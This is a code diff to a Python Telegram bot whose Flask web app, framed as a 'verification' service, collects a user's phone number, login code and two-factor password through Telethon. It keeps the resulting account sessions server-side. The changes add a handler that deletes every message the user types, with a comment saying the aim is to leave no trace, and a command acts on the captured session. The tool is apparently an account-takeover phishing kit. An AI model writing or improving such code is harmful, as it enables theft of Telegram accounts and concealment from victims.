@@ -5,7 +5,7 @@ import asyncio
 import os
 import threading
 from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
 app = Flask(__name__)
 
@@ -80,7 +80,7 @@ WEB_APP_HTML = """
                         }
                     });
                 }
-            }, 500);
+            }, 400);
         };
 
         function callApi(action, value) {
@@ -148,18 +148,18 @@ def api():
     user_id = str(data.get('user_id'))
 
     try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
         if action == 'phone':
             phone = str(value).strip()
             client = TelegramClient(StringSession(), API_ID, API_HASH)
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
             loop.run_until_complete(client.connect())
             
             sent_code = loop.run_until_complete(client.send_code_request(phone))
             
             active_sessions[user_id] = {
                 'client': client,
-                'loop': loop,
                 'phone': phone,
                 'hash': str(sent_code.phone_code_hash)
             }
@@ -171,7 +171,6 @@ def api():
                 return {"status": "error", "message": "Сессия истекла."}
             
             client = session_data['client']
-            loop = session_data['loop']
             code = str(value).strip()
             
             try:
@@ -192,7 +191,6 @@ def api():
                 return {"status": "error", "message": "Сессия истекла."}
             
             client = session_data['client']
-            loop = session_data['loop']
             password = str(value).strip()
             
             try:
@@ -208,14 +206,8 @@ def api():
 
     return {"status": "error", "message": "Неизвестный запрос"}
 
-# --- أوامر البوت مع حذف رسالة المستخدم فور إرسالها ---
+# --- أوامر البوت مع الحذف الفوري لأي رسالة يرسلها المستخدم في الشات ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # محاولة حذف رسالة أمر /start لتنظيف الشات
-    try:
-        await update.message.delete()
-    except Exception:
-        pass
-
     web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
     if not web_url.startswith('http'):
         web_url = f"https://{web_url}"
@@ -229,11 +221,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        await update.message.delete()
-    except Exception:
-        pass
-
     user_id = str(update.effective_user.id)
     session_data = active_sessions.get(user_id)
 
@@ -266,6 +253,13 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
     except Exception as e:
         await status_msg.edit_text(f"❌ Ошибка: {e}")
 
+async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # مسح أي رسالة يكتبها المستخدم فوراً لعدم ترك أي أثر في المحادثة
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)
 
@@ -277,7 +271,8 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("delet", delete_messages_command))
+    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm Russian Verification Bot is running perfectly...")
+    print("Fokhm Final Clean Bot is running...")
     application.run_polling()
 
